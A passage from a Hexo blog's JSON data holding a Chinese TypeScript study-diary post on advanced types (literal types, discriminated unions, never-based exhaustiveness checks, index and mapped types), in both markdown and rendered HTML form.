class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 类名切换</span></span><br><span class=\"line\">element.classList.toggle(<span class=\"string\">'toggled-class'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 类名切换 - while</span></span><br><span class=\"line\"><span class=\"comment\">// 当第二个参数的表达式满足条件时，执行 toggle 操作</span></span><br><span class=\"line\"><span class=\"comment\">// 该方法目前还在 **实验** 阶段</span></span><br><span class=\"line\">element.classList.toggle(<span class=\"string\">'toggled-class'</span>, i &lt; <span class=\"number\">10</span>)</span><br></pre></td></tr></table></figure>\n<p>上面列举的这些方法已经在 <code>ie10</code> 以上的浏览器上普及，可以直接使用。<br>更多 <code>classList</code> 的方法可以参考<a href=\"https://developer.mozilla.org/en-US/docs/Web/API/DOMTokenList\" target=\"_blank\" rel=\"noopener\">这里</a>。</p>"},{"title":"Typescript学习日记(九)","date":"2017-03-02T03:01:21.000Z","_content":"\n\n本文主要介绍 `typescript` 几种高级类型及相关内容。\n<!-- more -->\n\n\n### 字符串字面量类型\n\n字符串字面量类型允许你指定字符串必须的固定值。 在实际应用中，字符串字面量类型可以与联合类型，类型保护和类型别名很好的配合。\n\n这里直接使用官方的例子：\n```ts\ntype Easing = \"ease-in\" | \"ease-out\" | \"ease-in-out\"; // 使用 type 重命名 联合类型\nclass UIElement {\n    animate(dx: number, dy: number, easing: Easing) {\n        if (easing === \"ease-in\") {\n            // ...\n        }\n        else if (easing === \"ease-out\") {\n        }\n        else if (easing === \"ease-in-out\") {\n        }\n        else {\n            // error，没传 easing\n        }\n    }\n}\n\nlet button = new UIElement();\nbutton.animate(0, 0, \"ease-in\");\nbutton.animate(0, 0, \"uneasy\"); // error，没有 uneasy 类型\n```\n\n字符串字面量类型还可以用于区分函数重载：\n```ts\nfunction createElement(tagName: \"img\"): HTMLImageElement; // img 标签\nfunction createElement(tagName: \"input\"): HTMLInputElement; // input 标签\n// ... \nfunction createElement(tagName: string): Element {\n    // ... \n}\n```\n\n### 数字字面量类型\n\nTypeScript还具有数字字面量类型。不过数字字面量类型很少使用，因为它不能像字符串字面量表达一个具有意义的值。\n\n```ts\nfunction rollDie(): 1 | 2 | 3 | 4 | 5 | 6 {\n    // ...\n}\n```\n\n### 枚举成员类型\n\n在我们谈及“单例类型”的时候，多数是指枚举成员类型和数字/字符串字面量类型，尽管大多数用户会互换使用“单例类型”和“字面量类型”。\n\n\n### 可辨识联合（Discriminated Unions）\n\n你可以合并 `单例类型`，`联合类型`，`类型保护` 和 `类型别名` 来创建一个叫做 `可辨识联合的高级模式`，它也称做 `标签联合` 或 `代数数据类型`。 可辨识联合在函数式编程很有用处。 一些语言会自动地为你辨识联合；而TypeScript则基于已有的JavaScript模式。 它具有3个要素：\n\n1. 具有普通的单例类型属性— `可辨识的特征`。\n2. 一个类型别名包含了那些类型的联合— 联合。\n3. 此属性上的类型保护。\n\n```ts\ninterface Square {\n    kind: \"square\";\n    size: number;\n}\ninterface Rectangle {\n    kind: \"rectangle\";\n    width: number;\n    height: number;\n}\ninterface Circle {\n    kind: \"circle\";\n    radius: number;\n}\n```\n\n每个接口都有 `kind` 属性但有不同的字符串字面量类型。 `kind` 属性称做 `可辨识的特征` 或 `标签`。\n将上面三个接口联合：\n\n```ts\ntype Shap = Square | Rectangle | Circle;\n```\n\n使用可辨识联合：\n\n```ts\nfunction area(s: Shape) {\n    switch (s.kind) {\n        case \"square\": return s.size * s.size;\n        case \"rectangle\": return s.height * s.width;\n        case \"circle\": return Math.PI * s.radius ** 2;\n    }\n}\n```\n\n发现了吗？这种写法估计大家都不会陌生，只是为这种形式起了一个合理化的名字罢了。\n\n#### 完整性检查\n\n当没有涵盖所有可辨识联合的变化时，我们想让编译器可以通知我们。 比如，如果我们添加了 `Triangle` 到 `Shape`，我们同时还需要更新 `area`:\n\n```ts\ntype Shap = Square | Rectangle | Circle | Triangle;\n\nfunction area(s: Shape) {\n    switch (s.kind) {\n        case \"square\": return s.size * s.size;\n        case \"rectangle\": return s.height * s.width;\n        case \"circle\": return Math.PI * s.radius ** 2;\n    }\n    // 这会出错，因为没有一个 Triangle 类型\n}\n```\n\n解决方法一：\n使用 `--strictNullChecks` 并且指定一个返回值类型;\n\n```ts\nfunction area(s: Shape): number { // error: returns number | undefined\n    switch (s.kind) {\n        case \"square\": return s.size * s.size;\n        case \"rectangle\": return s.height * s.width;\n        case \"circle\": return Math.PI * s.radius ** 2;\n    }\n}\n```\n因为 `switch` 没有包涵所有情况，所以 `TypeScript` 认为这个函数有时候会返回 `undefined`。 如果你明确地指定了返回值类型为 `number`，那么你会看到一个错误，因为实际上返回值的类型为 `number | undefined`。\n\n解决方法二：\n使用 `never` 类型，编译器用它来进行完整性检查。\n\n```ts\nfunction assertNever(x: never): never {\n    throw new Error(\"Unexpected object: \" + x);\n}\nfunction area(s: Shape) {\n    switch (s.kind) {\n        case \"square\": return s.size * s.size;\n        case \"rectangle\": return s.height * s.width;\n        case \"circle\": return Math.PI * s.radius ** 2;\n        default: return assertNever(s); // error，忘记的那个 case 类型将被 assertNever 标记为 never 类型，并抛出错误\n    }\n}\n```\n\n`assertNever` 检查 `s` 是否为 `never` 类型—-即为除去所有可能情况后剩下的类型。 如果你忘记了某个 `case`，那么 `s` 将具有一个真实的类型并且你会得到一个错误。\n\n### 多态的 this 类型\n\n不多解释。\n\n### 索引类型(Index types)\n\n使用索引类型，编译器就能够检查使用了动态属性名的代码。 例如，一个常见的 `javaScript` 模式是从对象中选取属性的子集。\n\n下面是如何在 `TypeScript` 里使用此函数，通过 `索引类型查询` 和 `索引访问` 操作符：\n\n```ts\n// keyof 索引类型查询操作符，类似与 javascript 中的 for in 遍历中的取 key 操作\n// T[K] 索引访问操作符，T[K][] 这里表示 取值后的类型，就是返回的类型\n// pluck(person, ['name']) -> T[k][] -> 'Jarid'[] -> string[]\nfunction pluck<T, K extends keyof T>(o: T, names: K[]): T[K][] {\n  return names.map(n => o[n]);\n}\n\ninterface Person {\n    name: string;\n    age: number;\n}\nlet person: Person = {\n    name: 'Jarid',\n    age: 35\n};\nlet strings: string[] = pluck(person, ['name']);// -> return ['Jarid']\n```\n\n编译器会检查 `name` 是否真的是 `Person` 的一个属性。 本例还引入了几个新的类型操作符。 首先是 `keyof T`， 索引类型查询操作符。 对于任何类型 `T`， `keyof T`的结果为 `T` 上已知的公共属性名的联合。例如：\n\n```ts\nlet props: keyof Person;  \n// -> name | age\n// keyof Person是完全可以与 'name' | 'age'互相替换的\n```\n\n第二个操作符是 `T[K]`， 索引访问操作符。在这里，类型语法反映了表达式语法。 这意味着 `person['name']` 具有类型 `Person['name']` —- 在我们的例子里则为 `string` 类型。 然而，就像索引类型查询一样，你可以在普通的上下文里使用 `T[K]`，这正是它的强大所在。 你只要确保类型变量 `K extends keyof T` 就可以了。\n\n\n#### 索引类型和字符串索引签名\n\n```ts\ninterface Map<T> {\n    [key: string]: T;\n}\n// Map 是一个只包含一对键值的对象 key -> string，value -> T\n\nlet keys: keyof Map<number>; // string\nlet value: Map<number>['foo']; // number\n```\n\n### 映射类型\n\n通过 `映射类型` 将一个已知的类型每个属性都变为可选的/只读的。在映射类型里，新类型以相同的形式去转换旧类型里每个属性。\n\n```ts\n// 转换成只读属性\ntype Readonly<T> = {\n    readonly [P in keyof T]: T[P];\n}\n\n// 转换成可选属性\ntype Partial<T> = {\n    [P in keyof T]?: T[P];\n}\n```\n\n使用方式：\n\n```ts\ntype PersonPartial = Partial<Person>;\ntype ReadonlyPerson = Readonly<Person>;\n\n// 假设Person interface Person = {age: number; gender: string; name: string}\n\ntype Readonly<T> = {\n    readonly [P in keyof T]: T[P];\n}\n\n// T -> Person\n// P in keyof T -> keyof T 指的是 Person 中所有的 key\n// P in keyof T -> P 为 age & gender & name\n// T[P] 取值操作\n\n```\n\n再看一个`包装属性`的例子：\n\n```ts\ntype Proxy<T> = {\n    get(): T;\n    set(value: T): void;\n}\ntype Proxify<T> = {\n    [P in keyof T]: Proxy<T[P]>;\n}\nfunction proxify<T>(o: T): Proxify<T> {\n   // ...\n}\nlet proxyProps = proxify(props);\n```\n是不是有种函数互相嵌套的感觉？\n\n**`Pick`**\n取出指定的属性。\n\n定义：\n```ts\ntype Pick<T, K extends keyof T> = {\n    [P in K]: T[P];\n}\n```\n\n我们用上面的Person来使用：\n```ts\n\ntype PickPerson = Pick<Person, 'age' | 'name'>; // -> {age: number; name: string}\n\n\n// T: Person, K: 'age' | 'name',  T: 'age' | 'gender' | 'age', P: 'age' | 'name',\n// [P in K] 遍历 K\n// T[P] 取值\n```\n\n**`Record`**\n将传入的属性统一定义类型。\n\n```ts\ntype Record<K extends string, T> = {\n    [P in K]: T;\n}\n\ntype RecordPerson = Record<'gender' | 'name', string>; // -> {gender: string; name: string}\n\n// K: 'gender' | 'name', T: string\n```\n\n\n#### 由映射类型进行推断\n\n上面是包装属性，下面看下如何拆包。\n\n```ts\nfunction unproxify<T>(t: Proxify<T>): T {\n    let result = {} as T;\n    for (const k in t) {\n        result[k] = t[k].get();\n    }\n    return result;\n}\n\n```\n\n","source":"_posts/Typescript学习日记（九）.md","raw":"---\ntitle: Typescript学习日记(九)\ndate: 2017-03-02 11:01:21\ntags:\n---\n\n\n本文主要介绍 `typescript` 几种高级类型及相关内容。\n<!-- more -->\n\n\n### 字符串字面量类型\n\n字符串字面量类型允许你指定字符串必须的固定值。 在实际应用中，字符串字面量类型可以与联合类型，类型保护和类型别名很好的配合。\n\n这里直接使用官方的例子：\n```ts\ntype Easing = \"ease-in\" | \"ease-out\" | \"ease-in-out\"; // 使用 type 重命名 联合类型\nclass UIElement {\n    animate(dx: number, dy: number, easing: Easing) {\n        if (easing === \"ease-in\") {\n            // ...\n        }\n        else if (easing === \"ease-out\") {\n        }\n        else if (easing === \"ease-in-out\") {\n        }\n        else {\n            // error，没传 easing\n        }\n    }\n}\n\nlet button = new UIElement();\nbutton.animate(0, 0, \"ease-in\");\nbutton.animate(0, 0, \"uneasy\"); // error，没有 uneasy 类型\n```\n\n字符串字面量类型还可以用于区分函数重载：\n```ts\nfunction createElement(tagName: \"img\"): HTMLImageElement; // img 标签\nfunction createElement(tagName: \"input\"): HTMLInputElement; // input 标签\n// ... \nfunction createElement(tagName: string): Element {\n    // ... \n}\n```\n\n### 数字字面量类型\n\nTypeScript还具有数字字面量类型。不过数字字面量类型很少使用，因为它不能像字符串字面量表达一个具有意义的值。\n\n```ts\nfunction rollDie(): 1 | 2 | 3 | 4 | 5 | 6 {\n    // ...\n}\n```\n\n### 枚举成员类型\n\n在我们谈及“单例类型”的时候，多数是指枚举成员类型和数字/字符串字面量类型，尽管大多数用户会互换使用“单例类型”和“字面量类型”。\n\n\n### 可辨识联合（Discriminated Unions）\n\n你可以合并 `单例类型`，`联合类型`，`类型保护` 和 `类型别名` 来创建一个叫做 `可辨识联合的高级模式`，它也称做 `标签联合` 或 `代数数据类型`。 可辨识联合在函数式编程很有用处。 一些语言会自动地为你辨识联合；而TypeScript则基于已有的JavaScript模式。 它具有3个要素：\n\n1. 具有普通的单例类型属性— `可辨识的特征`。\n2. 一个类型别名包含了那些类型的联合— 联合。\n3. 此属性上的类型保护。\n\n```ts\ninterface Square {\n    kind: \"square\";\n    size: number;\n}\ninterface Rectangle {\n    kind: \"rectangle\";\n    width: number;\n    height: number;\n}\ninterface Circle {\n    kind: \"circle\";\n    radius: number;\n}\n```\n\n每个接口都有 `kind` 属性但有不同的字符串字面量类型。 `kind` 属性称做 `可辨识的特征` 或 `标签`。\n将上面三个接口联合：\n\n```ts\ntype Shap = Square | Rectangle | Circle;\n```\n\n使用可辨识联合：\n\n```ts\nfunction area(s: Shape) {\n    switch (s.kind) {\n        case \"square\": return s.size * s.size;\n        case \"rectangle\": return s.height * s.width;\n        case \"circle\": return Math.PI * s.radius ** 2;\n    }\n}\n```\n\n发现了吗？这种写法估计大家都不会陌生，只是为这种形式起了一个合理化的名字罢了。\n\n#### 完整性检查\n\n当没有涵盖所有可辨识联合的变化时，我们想让编译器可以通知我们。 比如，如果我们添加了 `Triangle` 到 `Shape`，我们同时还需要更新 `area`:\n\n```ts\ntype Shap = Square | Rectangle | Circle | Triangle;\n\nfunction area(s: Shape) {\n    switch (s.kind) {\n        case \"square\": return s.size * s.size;\n        case \"rectangle\": return s.height * s.width;\n        case \"circle\": return Math.PI * s.radius ** 2;\n    }\n    // 这会出错，因为没有一个 Triangle 类型\n}\n```\n\n解决方法一：\n使用 `--strictNullChecks` 并且指定一个返回值类型;\n\n```ts\nfunction area(s: Shape): number { // error: returns number | undefined\n    switch (s.kind) {\n        case \"square\": return s.size * s.size;\n        case \"rectangle\": return s.height * s.width;\n        case \"circle\": return Math.PI * s.radius ** 2;\n    }\n}\n```\n因为 `switch` 没有包涵所有情况，所以 `TypeScript` 认为这个函数有时候会返回 `undefined`。 如果你明确地指定了返回值类型为 `number`，那么你会看到一个错误，因为实际上返回值的类型为 `number | undefined`。\n\n解决方法二：\n使用 `never` 类型，编译器用它来进行完整性检查。\n\n```ts\nfunction assertNever(x: never): never {\n    throw new Error(\"Unexpected object: \" + x);\n}\nfunction area(s: Shape) {\n    switch (s.kind) {\n        case \"square\": return s.size * s.size;\n        case \"rectangle\": return s.height * s.width;\n        case \"circle\": return Math.PI * s.radius ** 2;\n        default: return assertNever(s); // error，忘记的那个 case 类型将被 assertNever 标记为 never 类型，并抛出错误\n    }\n}\n```\n\n`assertNever` 检查 `s` 是否为 `never` 类型—-即为除去所有可能情况后剩下的类型。 如果你忘记了某个 `case`，那么 `s` 将具有一个真实的类型并且你会得到一个错误。\n\n### 多态的 this 类型\n\n不多解释。\n\n### 索引类型(Index types)\n\n使用索引类型，编译器就能够检查使用了动态属性名的代码。 例如，一个常见的 `javaScript` 模式是从对象中选取属性的子集。\n\n下面是如何在 `TypeScript` 里使用此函数，通过 `索引类型查询` 和 `索引访问` 操作符：\n\n```ts\n// keyof 索引类型查询操作符，类似与 javascript 中的 for in 遍历中的取 key 操作\n// T[K] 索引访问操作符，T[K][] 这里表示 取值后的类型，就是返回的类型\n// pluck(person, ['name']) -> T[k][] -> 'Jarid'[] -> string[]\nfunction pluck<T, K extends keyof T>(o: T, names: K[]): T[K][] {\n  return names.map(n => o[n]);\n}\n\ninterface Person {\n    name: string;\n    age: number;\n}\nlet person: Person = {\n    name: 'Jarid',\n    age: 35\n};\nlet strings: string[] = pluck(person, ['name']);// -> return ['Jarid']\n```\n\n编译器会检查 `name` 是否真的是 `Person` 的一个属性。 本例还引入了几个新的类型操作符。 首先是 `keyof T`， 索引类型查询操作符。 对于任何类型 `T`， `keyof T`的结果为 `T` 上已知的公共属性名的联合。例如：\n\n```ts\nlet props: keyof Person;  \n// -> name | age\n// keyof Person是完全可以与 'name' | 'age'互相替换的\n```\n\n第二个操作符是 `T[K]`， 索引访问操作符。在这里，类型语法反映了表达式语法。 这意味着 `person['name']` 具有类型 `Person['name']` —- 在我们的例子里则为 `string` 类型。 然而，就像索引类型查询一样，你可以在普通的上下文里使用 `T[K]`，这正是它的强大所在。 你只要确保类型变量 `K extends keyof T` 就可以了。\n\n\n#### 索引类型和字符串索引签名\n\n```ts\ninterface Map<T> {\n    [key: string]: T;\n}\n// Map 是一个只包含一对键值的对象 key -> string，value -> T\n\nlet keys: keyof Map<number>; // string\nlet value: Map<number>['foo']; // number\n```\n\n### 映射类型\n\n通过 `映射类型` 将一个已知的类型每个属性都变为可选的/只读的。在映射类型里，新类型以相同的形式去转换旧类型里每个属性。\n\n```ts\n// 转换成只读属性\ntype Readonly<T> = {\n    readonly [P in keyof T]: T[P];\n}\n\n// 转换成可选属性\ntype Partial<T> = {\n    [P in keyof T]?: T[P];\n}\n```\n\n使用方式：\n\n```ts\ntype PersonPartial = Partial<Person>;\ntype ReadonlyPerson = Readonly<Person>;\n\n// 假设Person interface Person = {age: number; gender: string; name: string}\n\ntype Readonly<T> = {\n    readonly [P in keyof T]: T[P];\n}\n\n// T -> Person\n// P in keyof T -> keyof T 指的是 Person 中所有的 key\n// P in keyof T -> P 为 age & gender & name\n// T[P] 取值操作\n\n```\n\n再看一个`包装属性`的例子：\n\n```ts\ntype Proxy<T> = {\n    get(): T;\n    set(value: T): void;\n}\ntype Proxify<T> = {\n    [P in keyof T]: Proxy<T[P]>;\n}\nfunction proxify<T>(o: T): Proxify<T> {\n   // ...\n}\nlet proxyProps = proxify(props);\n```\n是不是有种函数互相嵌套的感觉？\n\n**`Pick`**\n取出指定的属性。\n\n定义：\n```ts\ntype Pick<T, K extends keyof T> = {\n    [P in K]: T[P];\n}\n```\n\n我们用上面的Person来使用：\n```ts\n\ntype PickPerson = Pick<Person, 'age' | 'name'>; // -> {age: number; name: string}\n\n\n// T: Person, K: 'age' | 'name',  T: 'age' | 'gender' | 'age', P: 'age' | 'name',\n// [P in K] 遍历 K\n// T[P] 取值\n```\n\n**`Record`**\n将传入的属性统一定义类型。\n\n```ts\ntype Record<K extends string, T> = {\n    [P in K]: T;\n}\n\ntype RecordPerson = Record<'gender' | 'name', string>; // -> {gender: string; name: string}\n\n// K: 'gender' | 'name', T: string\n```\n\n\n#### 由映射类型进行推断\n\n上面是包装属性，下面看下如何拆包。\n\n```ts\nfunction unproxify<T>(t: Proxify<T>): T {\n    let result = {} as T;\n    for (const k in t) {\n        result[k] = t[k].get();\n    }\n    return result;\n}\n\n```\n\n","slug":"Typescript学习日记（九）","published":1,"updated":"2018-10-25T06:05:58.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjno6s7r0000m02vsaxa47rqq","content":"<p>本文主要介绍 <code>typescript</code> 几种高级类型及相关内容。<br><a id=\"more\"></a></p>\n<h3 id=\"字符串字面量类型\"><a href=\"#字符串字面量类型\" class=\"headerlink\" title=\"字符串字面量类型\"></a>字符串字面量类型</h3><p>字符串字面量类型允许你指定字符串必须的固定值。 在实际应用中，字符串字面量类型可以与联合类型，类型保护和类型别名很好的配合。</p>\n<p>这里直接使用官方的例子：<br><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">type</span> Easing = <span class=\"string\">\"ease-in\"</span> | <span class=\"string\">\"ease-out\"</span> | <span class=\"string\">\"ease-in-out\"</span>; <span class=\"comment\">// 使用 type 重命名 联合类型</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> UIElement &#123;</span><br><span class=\"line\">    animate(dx: <span class=\"built_in\">number</span>, dy: <span class=\"built_in\">number</span>, easing: Easing) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (easing === <span class=\"string\">\"ease-in\"</span>) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// ...</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (easing === <span class=\"string\">\"ease-out\"</span>) &#123;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (easing === <span class=\"string\">\"ease-in-out\"</span>) &#123;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"comment\">// error，没传 easing</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> button = <span class=\"keyword\">new</span> UIElement();</span><br><span class=\"line\">button.animate(<span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"string\">\"ease-in\"</span>);</span><br><span class=\"line\">button.animate(<span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"string\">\"uneasy\"</span>); <span class=\"comment\">// error，没有 uneasy 类型</span></span><br></pre></td></tr></table></figure></p>\n<p>字符串字面量类型还可以用于区分函数重载：<br><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">createElement</span>(<span class=\"params\">tagName: \"img\"</span>): <span class=\"title\">HTMLImageElement</span></span>; <span class=\"comment\">// img 标签</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">createElement</span>(<span class=\"params\">tagName: \"input\"</span>): <span class=\"title\">HTMLInputElement</span></span>; <span class=\"comment\">// input 标签</span></span><br><span class=\"line\"><span class=\"comment\">// ... </span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">createElement</span>(<span class=\"params\">tagName: <span class=\"built_in\">string</span></span>): <span class=\"title\">Element</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// ... </span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"数字字面量类型\"><a href=\"#数字字面量类型\" class=\"headerlink\" title=\"数字字面量类型\"></a>数字字面量类型</h3><p>TypeScript还具有数字字面量类型。不过数字字面量类型很少使用，因为它不能像字符串字面量表达一个具有意义的值。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">rollDie</span>(<span class=\"params\"></span>): 1 | 2 | 3 | 4 | 5 | 6 </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// ...</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"枚举成员类型\"><a href=\"#枚举成员类型\" class=\"headerlink\" title=\"枚举成员类型\"></a>枚举成员类型</h3><p>在我们谈及“单例类型”的时候，多数是指枚举成员类型和数字/字符串字面量类型，尽管大多数用户会互换使用“单例类型”和“字面量类型”。</p>\n<h3 id=\"可辨识联合（Discriminated-Unions）\"><a href=\"#可辨识联合（Discriminated-Unions）\" class=\"headerlink\" title=\"可辨识联合（Discriminated Unions）\"></a>可辨识联合（Discriminated Unions）</h3><p>你可以合并 <code>单例类型</code>，<code>联合类型</code>，<code>类型保护</code> 和 <code>类型别名</code> 来创建一个叫做 <code>可辨识联合的高级模式</code>，它也称做 <code>标签联合</code> 或 <code>代数数据类型</code>。 可辨识联合在函数式编程很有用处。 一些语言会自动地为你辨识联合；而TypeScript则基于已有的JavaScript模式。 它具有3个要素：</p>\n<ol>\n<li>具有普通的单例类型属性— <code>可辨识的特征</code>。</li>\n<li>一个类型别名包含了那些类型的联合— 联合。</li>\n<li>此属性上的类型保护。</li>\n</ol>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">interface</span> Square &#123;</span><br><span class=\"line\">    kind: <span class=\"string\">\"square\"</span>;</span><br><span class=\"line\">    size: <span class=\"built_in\">number</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">interface</span> Rectangle &#123;</span><br><span class=\"line\">    kind: <span class=\"string\">\"rectangle\"</span>;</span><br><span class=\"line\">    width: <span class=\"built_in\">number</span>;</span><br><span class=\"line\">    height: <span class=\"built_in\">number</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">interface</span> Circle &#123;</span><br><span class=\"line\">    kind: <span class=\"string\">\"circle\"</span>;</span><br><span class=\"line\">    radius: <span class=\"built_in\">number</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>每个接口都有 <code>kind</code> 属性但有不同的字符串字面量类型。 <code>kind</code> 属性称做 <code>可辨识的特征</code> 或 <code>标签</code>。<br>将上面三个接口联合：</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">type</span> Shap = Square | Rectangle | Circle;</span><br></pre></td></tr></table></figure>\n<p>使用可辨识联合：</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">area</span>(<span class=\"params\">s: Shape</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">switch</span> (s.kind) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"string\">\"square\"</span>: <span class=\"keyword\">return</span> s.size * s.size;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"string\">\"rectangle\"</span>: <span class=\"keyword\">return</span> s.height * s.width;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"string\">\"circle\"</span>: <span class=\"keyword\">return</span> <span class=\"built_in\">Math</span>.PI * s.radius ** <span class=\"number\">2</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>发现了吗？这种写法估计大家都不会陌生，只是为这种形式起了一个合理化的名字罢了。</p>\n<h4 id=\"完整性检查\"><a href=\"#完整性检查\" class=\"headerlink\" title=\"完整性检查\"></a>完整性检查</h4><p>当没有涵盖所有可辨识联合的变化时，我们想让编译器可以通知我们。 比如，如果我们添加了 <code>Triangle</code> 到 <code>Shape</code>，我们同时还需要更新 <code>area</code>:</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">type</span> Shap = Square | Rectangle | Circle | Triangle;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">area</span>(<span class=\"params\">s: Shape</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">switch</span> (s.kind) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"string\">\"square\"</span>: <span class=\"keyword\">return</span> s.size * s.size;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"string\">\"rectangle\"</span>: <span class=\"keyword\">return</span> s.height * s.width;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"string\">\"circle\"</span>: <span class=\"keyword\">return</span> <span class=\"built_in\">Math</span>.PI * s.radius ** <span class=\"number\">2</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// 这会出错，因为没有一个 Triangle 类型</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>解决方法一：<br>使用 <code>--strictNullChecks</code> 并且指定一个返回值类型;</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">area</span>(<span class=\"params\">s: Shape</span>): <span class=\"title\">number</span> </span>&#123; <span class=\"comment\">// error: returns number | undefined</span></span><br><span class=\"line\">    <span class=\"keyword\">switch</span> (s.kind) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"string\">\"square\"</span>: <span class=\"keyword\">return</span> s.size * s.size;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"string\">\"rectangle\"</span>: <span class=\"keyword\">return</span> s.height * s.width;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"string\">\"circle\"</span>: <span class=\"keyword\">return</span> <span class=\"built_in\">Math</span>.PI * s.radius ** <span class=\"number\">2</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>因为 <code>switch</code> 没有包涵所有情况，所以 <code>TypeScript</code> 认为这个函数有时候会返回 <code>undefined</code>。 如果你明确地指定了返回值类型为 <code>number</code>，那么你会看到一个错误，因为实际上返回值的类型为 <code>number | undefined</code>。</p>\n<p>解决方法二：<br>使用 <code>never</code> 类型，编译器用它来进行完整性检查。</p>\n<figure class=\"highlight 